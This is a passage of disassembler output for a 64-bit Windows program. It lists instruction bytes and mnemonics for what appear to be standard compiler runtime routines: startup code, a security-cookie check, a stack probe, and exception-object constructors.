   140001eb3:	5b                   	pop    %rbx
   140001eb4:	c3                   	ret
   140001eb5:	cc                   	int3
   140001eb6:	cc                   	int3
   140001eb7:	cc                   	int3
   140001eb8:	cc                   	int3
   140001eb9:	cc                   	int3
   140001eba:	cc                   	int3
   140001ebb:	cc                   	int3
   140001ebc:	cc                   	int3
   140001ebd:	cc                   	int3
   140001ebe:	cc                   	int3
   140001ebf:	cc                   	int3
   140001ec0:	40 53                	rex push %rbx
   140001ec2:	48 83 ec 20          	sub    $0x20,%rsp
   140001ec6:	48 8b d9             	mov    %rcx,%rbx
   140001ec9:	48 8d 05 80 24 00 00 	lea    0x2480(%rip),%rax        # 0x140004350
   140001ed0:	48 89 01             	mov    %rax,(%rcx)
   140001ed3:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140001ed7:	48 85 c9             	test   %rcx,%rcx
   140001eda:	74 0d                	je     0x140001ee9
   140001edc:	48 8b 01             	mov    (%rcx),%rax
   140001edf:	48 8b 40 10          	mov    0x10(%rax),%rax
   140001ee3:	ff 15 df 23 00 00    	call   *0x23df(%rip)        # 0x1400042c8
   140001ee9:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140001eed:	48 85 c9             	test   %rcx,%rcx
   140001ef0:	74 0c                	je     0x140001efe
   140001ef2:	48 83 c4 20          	add    $0x20,%rsp
   140001ef6:	5b                   	pop    %rbx
   140001ef7:	48 ff 25 c2 21 00 00 	rex.W jmp *0x21c2(%rip)        # 0x1400040c0
   140001efe:	48 83 c4 20          	add    $0x20,%rsp
   140001f02:	5b                   	pop    %rbx
   140001f03:	c3                   	ret
   140001f04:	cc                   	int3
   140001f05:	cc                   	int3
   140001f06:	cc                   	int3
   140001f07:	cc                   	int3
   140001f08:	cc                   	int3
   140001f09:	cc                   	int3
   140001f0a:	cc                   	int3
   140001f0b:	cc                   	int3
   140001f0c:	cc                   	int3
   140001f0d:	cc                   	int3
   140001f0e:	cc                   	int3
   140001f0f:	cc                   	int3
   140001f10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001f15:	57                   	push   %rdi
   140001f16:	48 83 ec 20          	sub    $0x20,%rsp
   140001f1a:	8b fa                	mov    %edx,%edi
   140001f1c:	48 8b d9             	mov    %rcx,%rbx
   140001f1f:	48 8d 05 2a 24 00 00 	lea    0x242a(%rip),%rax        # 0x140004350
   140001f26:	48 89 01             	mov    %rax,(%rcx)
   140001f29:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140001f2d:	48 85 c9             	test   %rcx,%rcx
   140001f30:	74 0d                	je     0x140001f3f
   140001f32:	48 8b 01             	mov    (%rcx),%rax
   140001f35:	48 8b 40 10          	mov    0x10(%rax),%rax
   140001f39:	ff 15 89 23 00 00    	call   *0x2389(%rip)        # 0x1400042c8
   140001f3f:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140001f43:	48 85 c9             	test   %rcx,%rcx
   140001f46:	74 07                	je     0x140001f4f
   140001f48:	ff 15 72 21 00 00    	call   *0x2172(%rip)        # 0x1400040c0
   140001f4e:	90                   	nop
   140001f4f:	40 f6 c7 01          	test   $0x1,%dil
   140001f53:	74 0d                	je     0x140001f62
   140001f55:	ba 20 00 00 00       	mov    $0x20,%edx
   140001f5a:	48 8b cb             	mov    %rbx,%rcx
   140001f5d:	e8 6e 00 00 00       	call   0x140001fd0
   140001f62:	48 8b c3             	mov    %rbx,%rax
   140001f65:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001f6a:	48 83 c4 20          	add    $0x20,%rsp
   140001f6e:	5f                   	pop    %rdi
   140001f6f:	c3                   	ret
   140001f70:	48 83 ec 48          	sub    $0x48,%rsp
   140001f74:	4c 8b c2             	mov    %rdx,%r8
   140001f77:	45 33 c9             	xor    %r9d,%r9d
   140001f7a:	8b d1                	mov    %ecx,%edx
   140001f7c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001f81:	e8 ea fe ff ff       	call   0x140001e70
   140001f86:	48 8d 15 cb 30 00 00 	lea    0x30cb(%rip),%rdx        # 0x140005058
   140001f8d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001f92:	e8 09 10 00 00       	call   0x140002fa0
   140001f97:	cc                   	int3
   140001f98:	cc                   	int3
   140001f99:	cc                   	int3
   140001f9a:	cc                   	int3
   140001f9b:	cc                   	int3
   140001f9c:	cc                   	int3
   140001f9d:	cc                   	int3
   140001f9e:	cc                   	int3
   140001f9f:	cc                   	int3
   140001fa0:	cc                   	int3
   140001fa1:	cc                   	int3
   140001fa2:	cc                   	int3
   140001fa3:	cc                   	int3
   140001fa4:	cc                   	int3
   140001fa5:	cc                   	int3
   140001fa6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140001fad:	00 00 00 
   140001fb0:	48 3b 0d 89 40 00 00 	cmp    0x4089(%rip),%rcx        # 0x140006040
   140001fb7:	75 10                	jne    0x140001fc9
   140001fb9:	48 c1 c1 10          	rol    $0x10,%rcx
   140001fbd:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140001fc2:	75 01                	jne    0x140001fc5
   140001fc4:	c3                   	ret
   140001fc5:	48 c1 c9 10          	ror    $0x10,%rcx
   140001fc9:	e9 76 03 00 00       	jmp    0x140002344
   140001fce:	cc                   	int3
   140001fcf:	cc                   	int3
   140001fd0:	e9 b7 04 00 00       	jmp    0x14000248c
   140001fd5:	cc                   	int3
   140001fd6:	cc                   	int3
   140001fd7:	cc                   	int3
   140001fd8:	40 53                	rex push %rbx
   140001fda:	48 83 ec 20          	sub    $0x20,%rsp
   140001fde:	48 8b d9             	mov    %rcx,%rbx
   140001fe1:	eb 0f                	jmp    0x140001ff2
   140001fe3:	48 8b cb             	mov    %rbx,%rcx
   140001fe6:	e8 df 0f 00 00       	call   0x140002fca
   140001feb:	85 c0                	test   %eax,%eax
   140001fed:	74 13                	je     0x140002002
   140001fef:	48 8b cb             	mov    %rbx,%rcx
   140001ff2:	e8 d9 0f 00 00       	call   0x140002fd0
   140001ff7:	48 85 c0             	test   %rax,%rax
   140001ffa:	74 e7                	je     0x140001fe3
   140001ffc:	48 83 c4 20          	add    $0x20,%rsp
   140002000:	5b                   	pop    %rbx
   140002001:	c3                   	ret
   140002002:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140002006:	74 06                	je     0x14000200e
   140002008:	e8 d3 05 00 00       	call   0x1400025e0
   14000200d:	cc                   	int3
   14000200e:	e8 ed 05 00 00       	call   0x140002600
   140002013:	cc                   	int3
   140002014:	40 53                	rex push %rbx
   140002016:	48 83 ec 20          	sub    $0x20,%rsp
   14000201a:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000201f:	e8 b8 0f 00 00       	call   0x140002fdc
   140002024:	e8 07 09 00 00       	call   0x140002930
   140002029:	8b c8                	mov    %eax,%ecx
   14000202b:	e8 e2 0f 00 00       	call   0x140003012
   140002030:	e8 ef 08 00 00       	call   0x140002924
   140002035:	8b d8                	mov    %eax,%ebx
   140002037:	e8 fa 0f 00 00       	call   0x140003036
   14000203c:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002041:	89 18                	mov    %ebx,(%rax)
   140002043:	e8 64 06 00 00       	call   0x1400026ac
   140002048:	84 c0                	test   %al,%al
   14000204a:	74 73                	je     0x1400020bf
   14000204c:	e8 a7 0b 00 00       	call   0x140002bf8
   140002051:	48 8d 0d dc 0b 00 00 	lea    0xbdc(%rip),%rcx        # 0x140002c34
   140002058:	e8 ff 07 00 00       	call   0x14000285c
   14000205d:	e8 c6 08 00 00       	call   0x140002928
   140002062:	8b c8                	mov    %eax,%ecx
   140002064:	e8 7f 0f 00 00       	call   0x140002fe8
   140002069:	85 c0                	test   %eax,%eax
   14000206b:	75 52                	jne    0x1400020bf
   14000206d:	e8 c6 08 00 00       	call   0x140002938
   140002072:	e8 01 09 00 00       	call   0x140002978
   140002077:	85 c0                	test   %eax,%eax
   140002079:	74 0c                	je     0x140002087
   14000207b:	48 8d 0d a2 08 00 00 	lea    0x8a2(%rip),%rcx        # 0x140002924
   140002082:	e8 5b 0f 00 00       	call   0x140002fe2
   140002087:	e8 f4 01 00 00       	call   0x140002280
   14000208c:	e8 ef 01 00 00       	call   0x140002280
   140002091:	e8 8e 08 00 00       	call   0x140002924
   140002096:	8b c8                	mov    %eax,%ecx
   140002098:	e8 8d 0f 00 00       	call   0x14000302a
   14000209d:	e8 a6 08 00 00       	call   0x140002948
   1400020a2:	84 c0                	test   %al,%al
   1400020a4:	74 05                	je     0x1400020ab
   1400020a6:	e8 43 0f 00 00       	call   0x140002fee
   1400020ab:	e8 74 08 00 00       	call   0x140002924
   1400020b0:	e8 73 0a 00 00       	call   0x140002b28
   1400020b5:	85 c0                	test   %eax,%eax
   1400020b7:	75 06                	jne    0x1400020bf
   1400020b9:	48 83 c4 20          	add    $0x20,%rsp
   1400020bd:	5b                   	pop    %rbx
   1400020be:	c3                   	ret
   1400020bf:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400020c4:	e8 d7 08 00 00       	call   0x1400029a0
   1400020c9:	cc                   	int3
   1400020ca:	cc                   	int3
   1400020cb:	cc                   	int3
   1400020cc:	48 83 ec 28          	sub    $0x28,%rsp
   1400020d0:	e8 87 08 00 00       	call   0x14000295c
   1400020d5:	33 c0                	xor    %eax,%eax
   1400020d7:	48 83 c4 28          	add    $0x28,%rsp
   1400020db:	c3                   	ret
   1400020dc:	48 83 ec 28          	sub    $0x28,%rsp
   1400020e0:	e8 9f 0a 00 00       	call   0x140002b84
   1400020e5:	e8 3a 08 00 00       	call   0x140002924
   1400020ea:	8b c8                	mov    %eax,%ecx
   1400020ec:	48 83 c4 28          	add    $0x28,%rsp
   1400020f0:	e9 3b 0f 00 00       	jmp    0x140003030
   1400020f5:	cc                   	int3
   1400020f6:	cc                   	int3
   1400020f7:	cc                   	int3
   1400020f8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400020fd:	57                   	push   %rdi
   1400020fe:	48 83 ec 30          	sub    $0x30,%rsp
   140002102:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002107:	e8 64 05 00 00       	call   0x140002670
   14000210c:	84 c0                	test   %al,%al
   14000210e:	0f 84 30 01 00 00    	je     0x140002244
   140002114:	40 32 ff             	xor    %dil,%dil
   140002117:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   14000211c:	e8 13 05 00 00       	call   0x140002634
   140002121:	8a d8                	mov    %al,%bl
   140002123:	8b 0d d7 45 00 00    	mov    0x45d7(%rip),%ecx        # 0x140006700
   140002129:	83 f9 01             	cmp    $0x1,%ecx
   14000212c:	0f 84 1d 01 00 00    	je     0x14000224f
   140002132:	85 c9                	test   %ecx,%ecx
   140002134:	75 4a                	jne    0x140002180
   140002136:	c7 05 c0 45 00 00 01 	movl   $0x1,0x45c0(%rip)        # 0x140006700
   14000213d:	00 00 00 
   140002140:	48 8d 15 d9 21 00 00 	lea    0x21d9(%rip),%rdx        # 0x140004320
   140002147:	48 8d 0d ba 21 00 00 	lea    0x21ba(%rip),%rcx        # 0x140004308
   14000214e:	e8 ad 0e 00 00       	call   0x140003000
   140002153:	85 c0                	test   %eax,%eax
   140002155:	74 0a                	je     0x140002161
   140002157:	b8 ff 00 00 00       	mov    $0xff,%eax
   14000215c:	e9 d8 00 00 00       	jmp    0x140002239
   140002161:	48 8d 15 98 21 00 00 	lea    0x2198(%rip),%rdx        # 0x140004300
   140002168:	48 8d 0d 81 21 00 00 	lea    0x2181(%rip),%rcx        # 0x1400042f0
   14000216f:	e8 86 0e 00 00       	call   0x140002ffa
   140002174:	c7 05 82 45 00 00 02 	movl   $0x2,0x4582(%rip)        # 0x140006700
   14000217b:	00 00 00 
   14000217e:	eb 08                	jmp    0x140002188
   140002180:	40 b7 01             	mov    $0x1,%dil
   140002183:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140002188:	8a cb                	mov    %bl,%cl
   14000218a:	e8 41 06 00 00       	call   0x1400027d0
   14000218f:	e8 f0 07 00 00       	call   0x140002984
   140002194:	48 8b d8             	mov    %rax,%rbx
   140002197:	48 83 38 00          	cmpq   $0x0,(%rax)
   14000219b:	74 1e                	je     0x1400021bb
   14000219d:	48 8b c8             	mov    %rax,%rcx
   1400021a0:	e8 93 05 00 00       	call   0x140002738
   1400021a5:	84 c0                	test   %al,%al
   1400021a7:	74 12                	je     0x1400021bb
   1400021a9:	45 33 c0             	xor    %r8d,%r8d
   1400021ac:	41 8d 50 02          	lea    0x2(%r8),%edx
   1400021b0:	33 c9                	xor    %ecx,%ecx
   1400021b2:	48 8b 03             	mov    (%rbx),%rax
   1400021b5:	ff 15 0d 21 00 00    	call   *0x210d(%rip)        # 0x1400042c8
   1400021bb:	e8 cc 07 00 00       	call   0x14000298c
   1400021c0:	48 8b d8             	mov    %rax,%rbx
   1400021c3:	48 83 38 00          	cmpq   $0x0,(%rax)
   1400021c7:	74 14                	je     0x1400021dd
   1400021c9:	48 8b c8             	mov    %rax,%rcx
   1400021cc:	e8 67 05 00 00       	call   0x140002738
   1400021d1:	84 c0                	test   %al,%al
   1400021d3:	74 08                	je     0x1400021dd
   1400021d5:	48 8b 0b             	mov    (%rbx),%rcx
   1400021d8:	e8 47 0e 00 00       	call   0x140003024
   1400021dd:	e8 0a 09 00 00       	call   0x140002aec
   1400021e2:	0f b7 d8             	movzwl %ax,%ebx
   1400021e5:	e8 0a 0e 00 00       	call   0x140002ff4
   1400021ea:	44 8b cb             	mov    %ebx,%r9d
   1400021ed:	4c 8b c0             	mov    %rax,%r8
   1400021f0:	33 d2                	xor    %edx,%edx
   1400021f2:	48 8d 0d 07 de ff ff 	lea    -0x21f9(%rip),%rcx        # 0x140000000
   1400021f9:	e8 b2 f9 ff ff       	call   0x140001bb0
   1400021fe:	8b d8                	mov    %eax,%ebx
   140002200:	e8 2b 09 00 00       	call   0x140002b30
   140002205:	84 c0                	test   %al,%al
   140002207:	74 50                	je     0x140002259
   140002209:	40 84 ff             	test   %dil,%dil
   14000220c:	75 05                	jne    0x140002213
   14000220e:	e8 05 0e 00 00       	call   0x140003018
   140002213:	33 d2                	xor    %edx,%edx
   140002215:	b1 01                	mov    $0x1,%cl
   140002217:	e8 d8 05 00 00       	call   0x1400027f4
   14000221c:	8b c3                	mov    %ebx,%eax
   14000221e:	eb 19                	jmp    0x140002239
   140002220:	8b d8                	mov    %eax,%ebx
   140002222:	e8 09 09 00 00       	call   0x140002b30
   140002227:	84 c0                	test   %al,%al
   140002229:	74 36                	je     0x140002261
   14000222b:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140002230:	75 05                	jne    0x140002237
   140002232:	e8 e7 0d 00 00       	call   0x14000301e
   140002237:	8b c3                	mov    %ebx,%eax
   140002239:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000223e:	48 83 c4 30          	add    $0x30,%rsp
   140002242:	5f                   	pop    %rdi
   140002243:	c3                   	ret
   140002244:	b9 07 00 00 00       	mov    $0x7,%ecx
   140002249:	e8 52 07 00 00       	call   0x1400029a0
   14000224e:	90                   	nop
   14000224f:	b9 07 00 00 00       	mov    $0x7,%ecx
   140002254:	e8 47 07 00 00       	call   0x1400029a0
   140002259:	8b cb                	mov    %ebx,%ecx
   14000225b:	e8 a6 0d 00 00       	call   0x140003006
   140002260:	90                   	nop
   140002261:	8b cb                	mov    %ebx,%ecx
   140002263:	e8 a4 0d 00 00       	call   0x14000300c
   140002268:	90                   	nop
   140002269:	cc                   	int3
   14000226a:	cc                   	int3
   14000226b:	cc                   	int3
   14000226c:	48 83 ec 28          	sub    $0x28,%rsp
   140002270:	e8 ff 05 00 00       	call   0x140002874
   140002275:	48 83 c4 28          	add    $0x28,%rsp
   140002279:	e9 7a fe ff ff       	jmp    0x1400020f8
   14000227e:	cc                   	int3
   14000227f:	cc                   	int3
   140002280:	c2 00 00             	ret    $0x0
   140002283:	cc                   	int3
   140002284:	40 53                	rex push %rbx
   140002286:	48 83 ec 20          	sub    $0x20,%rsp
   14000228a:	48 8d 05 ff 20 00 00 	lea    0x20ff(%rip),%rax        # 0x140004390
   140002291:	48 8b d9             	mov    %rcx,%rbx
   140002294:	48 89 01             	mov    %rax,(%rcx)
   140002297:	f6 c2 01             	test   $0x1,%dl
   14000229a:	74 0a                	je     0x1400022a6
   14000229c:	ba 18 00 00 00       	mov    $0x18,%edx
   1400022a1:	e8 2a fd ff ff       	call   0x140001fd0
   1400022a6:	48 8b c3             	mov    %rbx,%rax
   1400022a9:	48 83 c4 20          	add    $0x20,%rsp
   1400022ad:	5b                   	pop    %rbx
   1400022ae:	c3                   	ret
   1400022af:	cc                   	int3
   1400022b0:	cc                   	int3
   1400022b1:	cc                   	int3
   1400022b2:	cc                   	int3
   1400022b3:	cc                   	int3
   1400022b4:	cc                   	int3
   1400022b5:	cc                   	int3
   1400022b6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400022bd:	00 00 00 
   1400022c0:	48 83 ec 10          	sub    $0x10,%rsp
   1400022c4:	4c 89 14 24          	mov    %r10,(%rsp)
   1400022c8:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   1400022cd:	4d 33 db             	xor    %r11,%r11
   1400022d0:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   1400022d5:	4c 2b d0             	sub    %rax,%r10
   1400022d8:	4d 0f 42 d3          	cmovb  %r11,%r10
   1400022dc:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   1400022e3:	00 00 
   1400022e5:	4d 3b d3             	cmp    %r11,%r10
   1400022e8:	73 16                	jae    0x140002300
   1400022ea:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   1400022f0:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   1400022f7:	41 c6 03 00          	movb   $0x0,(%r11)
   1400022fb:	4d 3b d3             	cmp    %r11,%r10
   1400022fe:	75 f0                	jne    0x1400022f0
   140002300:	4c 8b 14 24          	mov    (%rsp),%r10
   140002304:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   140002309:	48 83 c4 10          	add    $0x10,%rsp
   14000230d:	c3                   	ret
   14000230e:	cc                   	int3
   14000230f:	cc                   	int3
   140002310:	40 53                	rex push %rbx
   140002312:	48 83 ec 20          	sub    $0x20,%rsp
   140002316:	48 8b d9             	mov    %rcx,%rbx
   140002319:	33 c9                	xor    %ecx,%ecx
   14000231b:	ff 15 3f 1d 00 00    	call   *0x1d3f(%rip)        # 0x140004060
   140002321:	48 8b cb             	mov    %rbx,%rcx
   140002324:	ff 15 2e 1d 00 00    	call   *0x1d2e(%rip)        # 0x140004058
   14000232a:	ff 15 38 1d 00 00    	call   *0x1d38(%rip)        # 0x140004068
   140002330:	48 8b c8             	mov    %rax,%rcx
   140002333:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140002338:	48 83 c4 20          	add    $0x20,%rsp
   14000233c:	5b                   	pop    %rbx
   14000233d:	48 ff 25 34 1d 00 00 	rex.W jmp *0x1d34(%rip)        # 0x140004078
   140002344:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002349:	48 83 ec 38          	sub    $0x38,%rsp
   14000234d:	b9 17 00 00 00       	mov    $0x17,%ecx
   140002352:	ff 15 28 1d 00 00    	call   *0x1d28(%rip)        # 0x140004080
   140002358:	85 c0                	test   %eax,%eax
   14000235a:	74 07                	je     0x140002363
   14000235c:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002361:	cd 29                	int    $0x29
   140002363:	48 8d 0d c6 3e 00 00 	lea    0x3ec6(%rip),%rcx        # 0x140006230
   14000236a:	e8 a9 00 00 00       	call   0x140002418
   14000236f:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140002374:	48 89 05 ad 3f 00 00 	mov    %rax,0x3fad(%rip)        # 0x140006328
   14000237b:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140002380:	48 83 c0 08          	add    $0x8,%rax
   140002384:	48 89 05 3d 3f 00 00 	mov    %rax,0x3f3d(%rip)        # 0x1400062c8
   14000238b:	48 8b 05 96 3f 00 00 	mov    0x3f96(%rip),%rax        # 0x140006328
   140002392:	48 89 05 07 3e 00 00 	mov    %rax,0x3e07(%rip)        # 0x1400061a0
   140002399:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000239e:	48 89 05 0b 3f 00 00 	mov    %rax,0x3f0b(%rip)        # 0x1400062b0
   1400023a5:	c7 05 e1 3d 00 00 09 	movl   $0xc0000409,0x3de1(%rip)        # 0x140006190
   1400023ac:	04 00 c0 
   1400023af:	c7 05 db 3d 00 00 01 	movl   $0x1,0x3ddb(%rip)        # 0x140006194
   1400023b6:	00 00 00 
   1400023b9:	c7 05 e5 3d 00 00 01 	movl   $0x1,0x3de5(%rip)        # 0x1400061a8
   1400023c0:	00 00 00 
   1400023c3:	b8 08 00 00 00       	mov    $0x8,%eax
   1400023c8:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400023cc:	48 8d 0d dd 3d 00 00 	lea    0x3ddd(%rip),%rcx        # 0x1400061b0
   1400023d3:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   1400023da:	00 
   1400023db:	b8 08 00 00 00       	mov    $0x8,%eax
   1400023e0:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400023e4:	48 8b 0d 55 3c 00 00 	mov    0x3c55(%rip),%rcx        # 0x140006040
   1400023eb:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1400023f0:	b8 08 00 00 00       	mov    $0x8,%eax
   1400023f5:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1400023f9:	48 8b 0d 80 3c 00 00 	mov    0x3c80(%rip),%rcx        # 0x140006080
   140002400:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140002405:	48 8d 0d 8c 1f 00 00 	lea    0x1f8c(%rip),%rcx        # 0x140004398
   14000240c:	e8 ff fe ff ff       	call   0x140002310
   140002411:	90                   	nop
   140002412:	48 83 c4 38          	add    $0x38,%rsp
   140002416:	c3                   	ret
   140002417:	cc                   	int3
   140002418:	40 53                	rex push %rbx
   14000241a:	56                   	push   %rsi
   14000241b:	57                   	push   %rdi
   14000241c:	48 83 ec 40          	sub    $0x40,%rsp
   140002420:	48 8b d9             	mov    %rcx,%rbx
   140002423:	ff 15 17 1c 00 00    	call   *0x1c17(%rip)        # 0x140004040
   140002429:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140002430:	33 ff                	xor    %edi,%edi
   140002432:	45 33 c0             	xor    %r8d,%r8d
   140002435:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000243a:	48 8b ce             	mov    %rsi,%rcx
   14000243d:	ff 15 05 1c 00 00    	call   *0x1c05(%rip)        # 0x140004048
   140002443:	48 85 c0             	test   %rax,%rax
   140002446:	74 3c                	je     0x140002484
   140002448:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   14000244d:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140002452:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140002459:	00 00 
   14000245b:	4c 8b c8             	mov    %rax,%r9
   14000245e:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140002463:	4c 8b c6             	mov    %rsi,%r8
   140002466:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000246b:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140002470:	33 c9                	xor    %ecx,%ecx
   140002472:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002477:	ff 15 d3 1b 00 00    	call   *0x1bd3(%rip)        # 0x140004050
   14000247d:	ff c7                	inc    %edi
   14000247f:	83 ff 02             	cmp    $0x2,%edi
   140002482:	7c ae                	jl     0x140002432
   140002484:	48 83 c4 40          	add    $0x40,%rsp
   140002488:	5f                   	pop    %rdi
   140002489:	5e                   	pop    %rsi
   14000248a:	5b                   	pop    %rbx
   14000248b:	c3                   	ret
   14000248c:	e9 ab 0b 00 00       	jmp    0x14000303c
   140002491:	cc                   	int3
   140002492:	cc                   	int3
   140002493:	cc                   	int3
   140002494:	40 53                	rex push %rbx
   140002496:	48 83 ec 20          	sub    $0x20,%rsp
   14000249a:	48 8b d9             	mov    %rcx,%rbx
   14000249d:	48 8b c2             	mov    %rdx,%rax
   1400024a0:	48 8d 0d 09 1f 00 00 	lea    0x1f09(%rip),%rcx        # 0x1400043b0
   1400024a7:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400024aa:	48 89 0b             	mov    %rcx,(%rbx)
   1400024ad:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400024b1:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400024b5:	0f 11 02             	movups %xmm0,(%rdx)
   1400024b8:	e8 f5 0a 00 00       	call   0x140002fb2
   1400024bd:	48 8d 05 1c 1f 00 00 	lea    0x1f1c(%rip),%rax        # 0x1400043e0
   1400024c4:	48 89 03             	mov    %rax,(%rbx)
   1400024c7:	48 8b c3             	mov    %rbx,%rax
   1400024ca:	48 83 c4 20          	add    $0x20,%rsp
   1400024ce:	5b                   	pop    %rbx
   1400024cf:	c3                   	ret
   1400024d0:	48 8d 05 19 1f 00 00 	lea    0x1f19(%rip),%rax        # 0x1400043f0
   1400024d7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1400024de:	00 
   1400024df:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400024e3:	48 8d 05 f6 1e 00 00 	lea    0x1ef6(%rip),%rax        # 0x1400043e0
   1400024ea:	48 89 01             	mov    %rax,(%rcx)
   1400024ed:	48 8b c1             	mov    %rcx,%rax
   1400024f0:	c3                   	ret
   1400024f1:	cc                   	int3
   1400024f2:	cc                   	int3
   1400024f3:	cc                   	int3
   1400024f4:	40 53                	rex push %rbx
   1400024f6:	48 83 ec 20          	sub    $0x20,%rsp
   1400024fa:	48 8b d9             	mov    %rcx,%rbx
   1400024fd:	48 8b c2             	mov    %rdx,%rax
   140002500:	48 8d 0d a9 1e 00 00 	lea    0x1ea9(%rip),%rcx        # 0x1400043b0
   140002507:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000250a:	48 89 0b             	mov    %rcx,(%rbx)
   14000250d:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140002511:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140002515:	0f 11 02             	movups %xmm0,(%rdx)
   140002518:	e8 95 0a 00 00       	call   0x140002fb2
   14000251d:	48 8d 05 e4 1e 00 00 	lea    0x1ee4(%rip),%rax        # 0x140004408
   140002524:	48 89 03             	mov    %rax,(%rbx)
   140002527:	48 8b c3             	mov    %rbx,%rax
   14000252a:	48 83 c4 20          	add    $0x20,%rsp
   14000252e:	5b                   	pop    %rbx
   14000252f:	c3                   	ret
   140002530:	48 8d 05 e1 1e 00 00 	lea    0x1ee1(%rip),%rax        # 0x140004418
   140002537:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000253e:	00 
   14000253f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140002543:	48 8d 05 be 1e 00 00 	lea    0x1ebe(%rip),%rax        # 0x140004408
   14000254a:	48 89 01             	mov    %rax,(%rcx)
   14000254d:	48 8b c1             	mov    %rcx,%rax
   140002550:	c3                   	ret
   140002551:	cc                   	int3
   140002552:	cc                   	int3
   140002553:	cc                   	int3
   140002554:	40 53                	rex push %rbx
   140002556:	48 83 ec 20          	sub    $0x20,%rsp
   14000255a:	48 8b d9             	mov    %rcx,%rbx
   14000255d:	48 8b c2             	mov    %rdx,%rax
   140002560:	48 8d 0d 49 1e 00 00 	lea    0x1e49(%rip),%rcx        # 0x1400043b0
   140002567:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000256a:	48 89 0b             	mov    %rcx,(%rbx)
   14000256d:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140002571:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140002575:	0f 11 02             	movups %xmm0,(%rdx)
   140002578:	e8 35 0a 00 00       	call   0x140002fb2
   14000257d:	48 8b c3             	mov    %rbx,%rax
   140002580:	48 83 c4 20          	add    $0x20,%rsp
   140002584:	5b                   	pop    %rbx
   140002585:	c3                   	ret
   140002586:	cc                   	int3
   140002587:	cc                   	int3
   140002588:	48 8d 05 21 1e 00 00 	lea    0x1e21(%rip),%rax        # 0x1400043b0
   14000258f:	48 89 01             	mov    %rax,(%rcx)
   140002592:	48 83 c1 08          	add    $0x8,%rcx
   140002596:	e9 1d 0a 00 00       	jmp    0x140002fb8
   14000259b:	cc                   	int3
   14000259c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400025a1:	57                   	push   %rdi
   1400025a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400025a6:	48 8d 05 03 1e 00 00 	lea    0x1e03(%rip),%rax        # 0x1400043b0
   1400025ad:	48 8b f9             	mov    %rcx,%rdi
   1400025b0:	48 89 01             	mov    %rax,(%rcx)
   1400025b3:	8b da                	mov    %edx,%ebx
   1400025b5:	48 83 c1 08          	add    $0x8,%rcx
   1400025b9:	e8 fa 09 00 00       	call   0x140002fb8
   1400025be:	f6 c3 01             	test   $0x1,%bl
   1400025c1:	74 0d                	je     0x1400025d0
   1400025c3:	ba 18 00 00 00       	mov    $0x18,%edx
   1400025c8:	48 8b cf             	mov    %rdi,%rcx
   1400025cb:	e8 00 fa ff ff       	call   0x140001fd0
   1400025d0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400025d5:	48 8b c7             	mov    %rdi,%rax
